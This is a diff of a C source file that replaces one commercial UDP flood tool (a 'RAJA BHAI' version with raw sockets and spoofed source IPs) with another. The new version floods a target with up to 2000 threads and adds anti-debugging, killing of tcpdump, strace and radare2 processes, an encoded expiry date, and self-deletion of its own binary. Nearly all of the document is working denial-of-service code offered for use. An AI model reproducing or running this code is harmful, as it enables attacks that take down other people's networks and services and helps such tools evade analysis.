@@ -1,268 +1,356 @@
-#define _XOPEN_SOURCE 700
+#include <arpa/inet.h>
+#include <pthread.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <pthread.h>
-#include <unistd.h>
-#include <arpa/inet.h>
-#include <time.h>
-#include <sys/ioctl.h>
-#include <net/if.h>
-#include <netinet/ip.h>
-#include <netinet/udp.h>
-#include <sys/types.h>
 #include <sys/socket.h>
+#include <time.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <limits.h>
+#include <sys/ptrace.h>
+#include <openssl/sha.h>
+#include <openssl/evp.h>
+#include <dirent.h>
+#include <signal.h>
+#define MAX_PACKET_SIZE 9000
+#define SHA_LEN 32
+#define MAX_PPS 21000
+#define XOR_SECRET1 0xA5E1
+#define XOR_SECRET2 0xC37A
+#define MAX_THREADS 2000
 
-#define MAX_THREADS 500
-#define PAYLOAD_SIZE 1024
-#define EXPIRY_DATE "2095-12-31"
+// Payload to send - fixed string
+static const char PAYLOAD[] = "\x01\x01gets p h e";
+static unsigned int PAYLOADSIZE = sizeof(PAYLOAD) - 1;
 
-// RAJA BHAI branding colors
-#define RED "\033[1;31m"
-#define GREEN "\033[1;32m"
-#define YELLOW "\033[1;33m"
-#define BLUE "\033[1;34m"
-#define MAGENTA "\033[1;35m"
-#define CYAN "\033[1;36m"
-#define RESET "\033[0m"
+volatile unsigned int pps;
+volatile unsigned int sleeptime = 1;
+volatile int limiter;
 
-typedef struct {
-    char ip[16];
-    int port;
-    int duration;
-    int thread_id;
-} AttackParams;
+// XOR encoded expiry date constants
+static const int encoded_expiry_year  = 2025 ^ XOR_SECRET1;
+static const int encoded_expiry_month = 9 ^ XOR_SECRET2;
+static const int encoded_expiry_day   = 25 ^ XOR_SECRET1;
 
-// Custom packet header structure
-struct packet_header {
-    struct iphdr ip;
-    struct udphdr udp;
-    char payload[PAYLOAD_SIZE];
+int get_expiry_year() { return encoded_expiry_year ^ XOR_SECRET1; }
+int get_expiry_month() { return encoded_expiry_month ^ XOR_SECRET2; }
+int get_expiry_day() { return encoded_expiry_day ^ XOR_SECRET1; }
+
+// Hardcoded expected SHA256 hash (update after final build)
+static const unsigned char hardcoded_hash[SHA_LEN] = {
+    0xd2, 0xb1, 0x74, 0xfd, 0x01, 0x49, 0x3e, 0xec,
+    0xc3, 0xe6, 0xc3, 0x71, 0xe6, 0x01, 0x29, 0x0d,
+    0x15, 0x78, 0xf6, 0x95, 0xfe, 0x33, 0x7c, 0x60,
+    0xb4, 0xe8, 0xee, 0x9b, 0x21, 0x7d, 0x8f, 0xd4
 };
 
-// Function declarations
-void print_banner();
-int is_expired();
-void generate_payload(char* payload, int size);
-void* send_payload(void* arg);
-unsigned short checksum(unsigned short *ptr, int nbytes);
-void create_packet(struct packet_header *packet, const char* src_ip, const char* dst_ip, 
-                   int src_port, int dst_port, const char* payload, int payload_size);
+// Encrypted watermark payload
+static const unsigned char encrypted_watermark[] = {
+    0x31, 0xab, 0x47, 0xc2, 0x7e, 0x07, 0x6a, 0x43, 0xe7, 0x2e, 0xa3, 0x22, 0xe2, 0x8b, 0xad, 0x7f,
+    0x07, 0x79, 0x97, 0x0e, 0x2a, 0xa5, 0x9f, 0xff, 0x28, 0x00, 0xba, 0xbe, 0x8e, 0xc6, 0x6f, 0x98,
+    0xbf, 0xf9, 0x31, 0x10, 0xb6, 0x3a, 0x3c, 0x98, 0x73, 0x76, 0xbc, 0xf3, 0xc4, 0xe8, 0x8f, 0x25,
+    0xc1, 0x64, 0xb8, 0x55, 0xca, 0xd4, 0x20, 0xa9, 0x51, 0x55, 0x3d, 0xc0, 0x99, 0x54, 0x8e, 0xb5,
+    0xfe, 0x4a, 0xfe, 0x69, 0x0a, 0x0f, 0x91, 0xd6, 0x59, 0xef, 0x9b, 0xf0, 0xef, 0xbb, 0xb1, 0xb4,
+    0x95, 0x04, 0x32, 0x90, 0xc2, 0xe7, 0xdf, 0x68, 0xf5, 0xeb, 0x70, 0xa6, 0x65, 0x7e, 0x6b, 0x0b
+};
+static const size_t encrypted_watermark_len = sizeof(encrypted_watermark);
 
-int main(int argc, char* argv[]) {
-    print_banner();
-    
-    if (argc != 4) {
-        printf(RED "\nUsage: %s <IP> <PORT> <DURATION>\n" RESET, argv[0]);
-        printf(YELLOW "Example: %s 192.168.1.1 80 60\n\n" RESET, argv[0]);
-        return 1;
+// Encrypted expiry error message
+static const unsigned char encrypted_expiry_error[] = {
+    0xb8, 0x74, 0x07, 0x27, 0x2f, 0xb9, 0xc1, 0x32, 0x53, 0xa4, 0x5b, 0xc9, 0xe6, 0x7f, 0xe1, 0x7f,
+    0x97, 0x75, 0x07, 0xc9, 0x9b, 0xf8, 0x59, 0x2a, 0x2b, 0xbc, 0xbd, 0xf4, 0xe7, 0xfd, 0x2b, 0x91,
+    0xef, 0xf5, 0x0b, 0x2a, 0xec, 0xd8, 0xb5, 0x5f, 0x03, 0x24, 0xd7, 0x97, 0x43, 0x53, 0xc5, 0x8f,
+    0xd2, 0x85, 0x03, 0x72, 0xc0, 0xf9, 0x68, 0x84, 0xd1, 0xfe, 0x01, 0xce, 0xf7, 0x9f, 0xf0, 0x1e,
+    0xdf, 0x87, 0x95, 0xd1, 0xe7, 0x1b, 0x0e, 0x38, 0x1f, 0x64, 0x8b, 0xd0, 0xd5, 0x84, 0x26, 0x06,
+};
+static const size_t encrypted_expiry_error_len = sizeof(encrypted_expiry_error);
+
+// AES Key and IV (same as used to encrypt your messages)
+static const unsigned char aes_key[32] = {
+    0x60, 0x3d, 0xeb, 0x10, 0x15, 0xca, 0x71, 0xbe,
+    0x2b, 0x73, 0xae, 0xf0, 0x85, 0x7d, 0x77, 0x81,
+    0x1f, 0x35, 0x2c, 0x07, 0x3b, 0x61, 0x08, 0xd7,
+    0x2d, 0x98, 0x10, 0xa3, 0x09, 0x14, 0xdf, 0xf4
+};
+static const unsigned char aes_iv[16] = {
+    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
+    0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f
+};
+
+struct thread_data {
+    int thread_id;
+    struct sockaddr_in sin;
+};
+
+// Globals for decrypted expiry message
+unsigned char decrypted_expiry_error[256];
+size_t decrypted_expiry_error_len = 0;
+
+int aes_decrypt(const unsigned char *ciphertext, size_t ciphertext_len,
+                unsigned char *plaintext, size_t plaintext_buf_len, size_t *plaintext_len) {
+    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+    if (!ctx) return -1;
+    int len = 0, plaintext_len_temp = 0;
+    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aes_key, aes_iv) != 1) {
+        EVP_CIPHER_CTX_free(ctx);
+        return -1;
     }
-
-    if (is_expired()) {
-        printf(RED "\nBUY NEW FROM @IPxKINGYT\n" RESET);
-        printf(YELLOW "Contact for premium versions!\n\n" RESET);
-        return 1;
+    if (EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, (int)ciphertext_len) != 1) {
+        EVP_CIPHER_CTX_free(ctx);
+        return -1;
     }
-
-    AttackParams params;
-    strcpy(params.ip, argv[1]);
-    params.port = atoi(argv[2]);
-    params.duration = atoi(argv[3]);
-
-    printf(CYAN "\nūüöÄ Launching RAJA BHAI Premium Attack ūüöÄ\n" RESET);
-    printf(MAGENTA "Target: %s:%d\n" RESET, params.ip, params.port);
-    printf(MAGENTA "Duration: %d seconds\n" RESET, params.duration);
-    printf(MAGENTA "Threads: %d\n" RESET, MAX_THREADS);
-    printf(MAGENTA "Payload Size: %d bytes\n\n" RESET, PAYLOAD_SIZE);
-
-    printf(YELLOW "Initializing threads..." RESET);
-    fflush(stdout);
-
-    pthread_t threads[MAX_THREADS];
-    AttackParams thread_params[MAX_THREADS];
-
-    for (int i = 0; i < MAX_THREADS; i++) {
-        memcpy(&thread_params[i], &params, sizeof(AttackParams));
-        thread_params[i].thread_id = i + 1;
-        
-        if (pthread_create(&threads[i], NULL, send_payload, &thread_params[i]) != 0) {
-            perror("Thread creation failed");
-        }
-        
-        // Show progress for large thread counts
-        if (i % 50 == 0) {
-            printf(YELLOW "." RESET);
-            fflush(stdout);
-        }
+    plaintext_len_temp = len;
+    if (EVP_DecryptFinal_ex(ctx, plaintext + len, &len) != 1) {
+        EVP_CIPHER_CTX_free(ctx);
+        return -1;
     }
-
-    printf(GREEN " DONE!\n\n" RESET);
-    printf(RED "ūüĒ• ATTACK IN PROGRESS - RAJA BHAI STYLE ūüĒ•\n" RESET);
-
-    for (int i = 0; i < MAX_THREADS; i++) {
-        pthread_join(threads[i], NULL);
+    plaintext_len_temp += len;
+    if ((size_t)plaintext_len_temp >= plaintext_buf_len) {
+        EVP_CIPHER_CTX_free(ctx);
+        return -1;
     }
-
-    printf(GREEN "\n‚úÖ Attack completed successfully!\n" RESET);
-    printf(CYAN "Target: %s:%d for %d seconds\n\n" RESET, params.ip, params.port, params.duration);
-    printf(YELLOW "Thank you for using RAJA BHAI Premium Tools!\n" RESET);
-
+    plaintext[plaintext_len_temp] = '\0';
+    *plaintext_len = plaintext_len_temp;
+    EVP_CIPHER_CTX_free(ctx);
     return 0;
 }
 
-void print_banner() {
-    printf(RED "\n\n");
-    printf("‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚ĖĎ‚Ėą‚Ėą‚ēó‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚ĖĎ‚Ėą‚Ėą‚ēó‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēó\n");
-    printf("‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĎ‚ĖĎ‚Ėą‚Ėą‚ēĒ‚ēĚ‚Ėą‚Ėą‚ēĎ\n");
-    printf("‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĒ‚ēĚ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēź‚ēĚ‚ĖĎ‚Ėą‚Ėą‚ēĎ\n");
-    printf("‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĒ‚ēź‚Ėą‚Ėą‚ēó‚ĖĎ‚Ėą‚Ėą‚ēĎ\n");
-    printf("‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚ēö‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĒ‚ēĚ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ēö‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĎ\n");
-    printf("‚ēö‚ēź‚ēĚ‚ĖĎ‚ĖĎ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēĚ‚ĖĎ‚ĖĎ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēĚ‚ĖĎ‚ĖĎ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēĚ‚ĖĎ‚ēö‚ēź‚ēź‚ēź‚ēź‚ēĚ‚ĖĎ‚ēö‚ēź‚ēĚ‚ĖĎ‚ĖĎ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēĚ\n");
-    printf(BLUE "‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚ĖĎ‚Ėą‚Ėą‚ēó‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēó‚ĖĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚ĖĎ‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚Ėą‚ēó‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēó‚ĖĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚ĖĎ‚Ėą‚Ėą‚ēó‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó\n");
-    printf("‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚ĖĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĎ‚ĖĎ‚Ėą‚Ėą‚ēĒ‚ēĚ‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚ēź‚ēź‚ēĚ\n");
-    printf("‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĒ‚ēĚ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĒ‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēź‚ēĚ‚ĖĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚ĖĎ‚ĖĎ\n");
-    printf("‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚ēź‚ēĚ‚ĖĎ‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚ēö‚Ėą‚Ėą‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĒ‚ēź‚Ėą‚Ėą‚ēó‚ĖĎ‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚ēĚ‚ĖĎ‚ĖĎ\n");
-    printf("‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ĖĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ēö‚Ėą‚Ėą‚Ėą‚ēĎ‚ēö‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĒ‚ēĚ‚Ėą‚Ėą‚ēĎ‚ĖĎ‚ēö‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó\n");
-    printf("‚ēö‚ēź‚ēĚ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ĖĎ‚ēö‚ēź‚ēĚ‚ĖĎ‚ĖĎ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēĚ‚ĖĎ‚ĖĎ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēĚ‚ĖĎ‚ĖĎ‚ēö‚ēź‚ēź‚ēĚ‚ĖĎ‚ēö‚ēź‚ēź‚ēź‚ēź‚ēĚ‚ĖĎ‚ēö‚ēź‚ēĚ‚ĖĎ‚ĖĎ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēĚ\n");
-    printf(RESET);
-    printf(MAGENTA "ūüĒ• Premium UDP Flood Tool | By RAJA BHAI ūüĒ•\n");
-    printf(CYAN "‚≠ź Exclusive Version | For Educational Purposes Only ‚≠ź\n\n" RESET);
+int decrypt_expiry_error_message() {
+    return aes_decrypt(encrypted_expiry_error, encrypted_expiry_error_len,
+                       decrypted_expiry_error, sizeof(decrypted_expiry_error), &decrypted_expiry_error_len);
+}
+
+void print_watermark() {
+    unsigned char decrypted[1024];
+    size_t len;
+    if (aes_decrypt(encrypted_watermark, encrypted_watermark_len,
+                    decrypted, sizeof(decrypted), &len) == 0) {
+        printf("==============================\n");
+        printf("%.*s", (int)len, decrypted);
+        printf("==============================\n");
+    } else {
+        printf("==============================\n");
+        printf("Watermark decrypt error.\n");
+        printf("==============================\n");
+    }
+}
+
+void get_runtime_salt(unsigned char *salt, size_t len) {
+    char exe_path[PATH_MAX];
+    ssize_t len_read = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
+    if (len_read != -1) {
+        exe_path[len_read] = '\0';
+        int fd = open(exe_path, O_RDONLY);
+        if (fd != -1) {
+            ssize_t readlen = read(fd, salt, len);
+            if (readlen != (ssize_t)len)
+                memset(salt, 0xab, len);
+            close(fd);
+        } else {
+            memset(salt, 0xcd, len);
+        }
+    } else {
+        memset(salt, 0xef, len);
+    }
 }
 
 int is_expired() {
-    struct tm expiry_tm = {0};
-    struct tm current_tm = {0};
-
-    strptime(EXPIRY_DATE, "%Y-%m-%d", &expiry_tm);
+    struct tm exp = {0};
+    exp.tm_year = get_expiry_year() - 1900;
+    exp.tm_mon = get_expiry_month() - 1;
+    exp.tm_mday = get_expiry_day();
     time_t now = time(NULL);
-    localtime_r(&now, &current_tm);
-
-    if (difftime(mktime(&current_tm), mktime(&expiry_tm)) > 0) {
-        return 1;
-    }
-    return 0;
+    return difftime(mktime(&exp), now) < 0;
 }
 
-void generate_payload(char* payload, int size) {
-    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_-+={}[]|:;'<>,.?/";
-    for (int i = 0; i < size - 1; i++) {
-        payload[i] = charset[rand() % (sizeof(charset) - 1)];
+void self_delete_and_exit() {
+    char exe_path[PATH_MAX];
+    ssize_t len_read = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
+    if (len_read != -1) {
+        exe_path[len_read] = '\0';
+        remove(exe_path);
     }
-    payload[size - 1] = '\0';
+    exit(-1);
 }
 
-unsigned short checksum(unsigned short *ptr, int nbytes) {
-    register long sum;
-    unsigned short oddbyte;
-    register short answer;
-
-    sum = 0;
-    while (nbytes > 1) {
-        sum += *ptr++;
-        nbytes -= 2;
+void current_checksum_call(void) {
+    unsigned char salt[SHA_LEN];
+    unsigned char computed_hash[SHA_LEN];
+    unsigned int hash_len = 0;
+    get_runtime_salt(salt, SHA_LEN);
+    if (decrypt_expiry_error_message() != 0) {
+        return;
     }
-    if (nbytes == 1) {
-        oddbyte = 0;
-        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
-        sum += oddbyte;
+    EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
+    if (!mdctx) {
+        return;
     }
-
-    sum = (sum >> 16) + (sum & 0xffff);
-    sum += (sum >> 16);
-    answer = (short)~sum;
-    
-    return answer;
+    if (EVP_DigestInit_ex(mdctx, EVP_sha256(), NULL) != 1
+        || EVP_DigestUpdate(mdctx, salt, SHA_LEN) != 1) {
+        EVP_MD_CTX_free(mdctx);
+        return;
+    }
+    int year = get_expiry_year();
+    int month = get_expiry_month();
+    int day = get_expiry_day();
+    EVP_DigestUpdate(mdctx, &year, sizeof(year));
+    EVP_DigestUpdate(mdctx, &month, sizeof(month));
+    EVP_DigestUpdate(mdctx, &day, sizeof(day));
+    EVP_DigestUpdate(mdctx, PAYLOAD, PAYLOADSIZE);
+    EVP_DigestUpdate(mdctx, decrypted_expiry_error, decrypted_expiry_error_len);
+    if (EVP_DigestFinal_ex(mdctx, computed_hash, &hash_len) != 1) {
+        EVP_MD_CTX_free(mdctx);
+        return;
+    }
+    EVP_MD_CTX_free(mdctx);
+    printf("=== Current SHA256 Checksum ===\n");
+    for (unsigned int i = 0; i < hash_len; i++) {
+        printf("%02x", computed_hash[i]);
+    }
+    printf("\n");
 }
 
-void create_packet(struct packet_header *packet, const char* src_ip, const char* dst_ip, 
-                   int src_port, int dst_port, const char* payload, int payload_size) {
-    // IP header
-    packet->ip.ihl = 5;
-    packet->ip.version = 4;
-    packet->ip.tos = 0;
-    packet->ip.tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size);
-    packet->ip.id = htons(rand() % 65535);
-    packet->ip.frag_off = 0;
-    packet->ip.ttl = 255;
-    packet->ip.protocol = IPPROTO_UDP;
-    packet->ip.check = 0;
-    packet->ip.saddr = inet_addr(src_ip);
-    packet->ip.daddr = inet_addr(dst_ip);
-    packet->ip.check = checksum((unsigned short*)&packet->ip, sizeof(struct iphdr));
-
-    // UDP header
-    packet->udp.source = htons(src_port);
-    packet->udp.dest = htons(dst_port);
-    packet->udp.len = htons(sizeof(struct udphdr) + payload_size);
-    packet->udp.check = 0;
-
-    // Payload
-    memcpy(packet->payload, payload, payload_size);
+void verify_integrity_or_self_destruct(void) {
+    unsigned char salt[SHA_LEN];
+    unsigned char computed_hash[SHA_LEN];
+    unsigned int hash_len = 0;
+    get_runtime_salt(salt, SHA_LEN);
+    if (decrypt_expiry_error_message() != 0) {
+        self_delete_and_exit();
+     }
+    EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
+    if (!mdctx) {
+        self_delete_and_exit();
+    }
+    if (EVP_DigestInit_ex(mdctx, EVP_sha256(), NULL) != 1
+        || EVP_DigestUpdate(mdctx, salt, SHA_LEN) != 1) {
+        EVP_MD_CTX_free(mdctx);
+        self_delete_and_exit();
+    }
+    int year = get_expiry_year();
+    int month = get_expiry_month();
+    int day = get_expiry_day();
+    EVP_DigestUpdate(mdctx, &year, sizeof(year));
+    EVP_DigestUpdate(mdctx, &month, sizeof(month));
+    EVP_DigestUpdate(mdctx, &day, sizeof(day));
+    EVP_DigestUpdate(mdctx, PAYLOAD, PAYLOADSIZE);
+    EVP_DigestUpdate(mdctx, decrypted_expiry_error, decrypted_expiry_error_len);
+    if (EVP_DigestFinal_ex(mdctx, computed_hash, &hash_len) != 1) {
+        EVP_MD_CTX_free(mdctx);
+        self_delete_and_exit();
+    }
+    EVP_MD_CTX_free(mdctx);
+    if (hash_len != SHA_LEN || memcmp(computed_hash, hardcoded_hash, SHA_LEN) != 0) {
+        fprintf(stderr, "deleting...\n");
+        self_delete_and_exit();
+    }
 }
 
-void* send_payload(void* arg) {
-    AttackParams* params = (AttackParams*)arg;
-    int sock;
-    struct sockaddr_in server_addr;
-    char payload[PAYLOAD_SIZE];
-    char source_ip[16];
-    
-    // Generate random source IP for each thread
-    snprintf(source_ip, 16, "%d.%d.%d.%d", 
-             rand() % 256, rand() % 256, rand() % 256, rand() % 256);
-    
-    // Generate random source port
-    int source_port = 1024 + (rand() % 64512);
-    
-    // Generate powerful randomized payload
-    generate_payload(payload, PAYLOAD_SIZE);
-    
-    // Create raw socket for more powerful attack
-    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if (sock < 0) {
-        perror("Raw socket creation failed");
-        pthread_exit(NULL);
+void anti_debug(void) {
+    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
+        fprintf(stderr, "Debugger detected! Self-deleting...\n");
+        self_delete_and_exit();
     }
-    
-    int one = 1;
-    const int *val = &one;
-    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
-        perror("Setting IP_HDRINCL failed");
-        close(sock);
-        pthread_exit(NULL);
-    }
-    
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(params->port);
-    server_addr.sin_addr.s_addr = inet_addr(params->ip);
-    
-    // Prepare packet
-    struct packet_header packet;
-    create_packet(&packet, source_ip, params->ip, source_port, params->port, payload, PAYLOAD_SIZE);
-    
-    time_t start_time = time(NULL);
-    long packet_count = 0;
-    
-    while (time(NULL) - start_time < params->duration) {
-        if (sendto(sock, &packet, sizeof(packet), 0, 
-                  (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
-            perror("Send failed");
+    ptrace(PTRACE_DETACH, 0, NULL, NULL);
+}
+
+void kill_forbidden_tools_and_self_destruct(void) {
+    const char *tools[] = {"tcpdump", "r2", "radare2", "strace", "ltrace", NULL};
+    DIR *proc = opendir("/proc");
+    if (!proc)
+        return;
+    struct dirent *entry;
+    while ((entry = readdir(proc)) != NULL) {
+        if (entry->d_type != DT_DIR)
             continue;
-        }
-        packet_count++;
-        
-        // Update packet with new random values to avoid filtering
-        if (packet_count % 100 == 0) {
-            packet.ip.id = htons(rand() % 65535);
-            generate_payload(payload, PAYLOAD_SIZE);
-            memcpy(packet.payload, payload, PAYLOAD_SIZE);
+        char *endptr;
+        int pid = strtol(entry->d_name, &endptr, 10);
+        if (*endptr != '\0')
+            continue;
+        char comm_path[PATH_MAX];
+        snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", pid);
+        FILE *fc = fopen(comm_path, "r");
+        if (fc) {
+            char comm[256];
+            if (fgets(comm, sizeof(comm), fc) != NULL) {
+                comm[strcspn(comm, "\n")] = 0;
+                for (int i = 0; tools[i]; i++) {
+                    if (strcmp(comm, tools[i]) == 0) {
+                        kill(pid, SIGKILL);
+                        fprintf(stderr, "%s detected! Self-deleting...\n", tools[i]);
+                        self_delete_and_exit();
+                    }
+                }
+            }
+            fclose(fc);
         }
     }
+    closedir(proc);
+}
+
+void *flood(void *par1) {
+    struct thread_data *td = (struct thread_data *)par1;
+    struct sockaddr_in sin = td->sin;
+    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if (s < 0) {
+        exit(-1);
+    }
+    while (1) {
+        ssize_t sent =
+            sendto(s, PAYLOAD, PAYLOADSIZE, 0, (struct sockaddr *)&sin, sizeof(sin));
+        if (sent >= 0) {
+            pps++;
+        }
+        // No sleep or rate limiting here
+    }
+    close(s);
+    return NULL;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 5) {
+        fprintf(stdout,
+                "Usage: %s <attack_ip> <port> <duration_seconds> <num_threads>\n",
+                argv[0]);
+        exit(-1);
+    }
+    kill_forbidden_tools_and_self_destruct();
+    anti_debug();
+    verify_integrity_or_self_destruct();
+    if (is_expired()) {
+        fprintf(stderr,
+                "This binary has expired. Self-deleting...\n DM TO GET NEW FILE @SOULCRACK");
+        self_delete_and_exit();
+    }
+    print_watermark();
+    int duration = atoi(argv[3]);
+    int num_threads = atoi(argv[4]);
+    if (num_threads < 1 || num_threads > MAX_THREADS) {
+        fprintf(stderr, "Thread count must be 1-%d\n", MAX_THREADS);
+        exit(-1);
+    }
+    limiter = 0;
+    pps = 0;
+    struct sockaddr_in sin;
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(atoi(argv[2]));
+    sin.sin_addr.s_addr = inet_addr(argv[1]);
+    pthread_t thread[num_threads];
     
-    close(sock);
-    
-    printf(GREEN "[Thread %d] Sent %ld packets to %s:%d\n" RESET, 
-           params->thread_id, packet_count, params->ip, params->port);
-    
-    pthread_exit(NULL);
+    struct thread_data td[num_threads];
+    fprintf(stdout,
+            "Sending UDP packets to %s:%s IP spoofing for %d seconds using %d threads...\n",
+            argv[1], argv[2], duration, num_threads);
+    for (int i = 0; i < num_threads; i++) {
+        td[i].thread_id = i;
+        td[i].sin = sin;
+        if (pthread_create(&thread[i], NULL, &flood, (void *)&td[i]) != 0) {
+            perror("Thread creation failed");
+            exit(-1);
+        }
+    }
+    // Just wait for duration seconds, threads flood nonstop
+    sleep(duration);
+    return 0;
 }
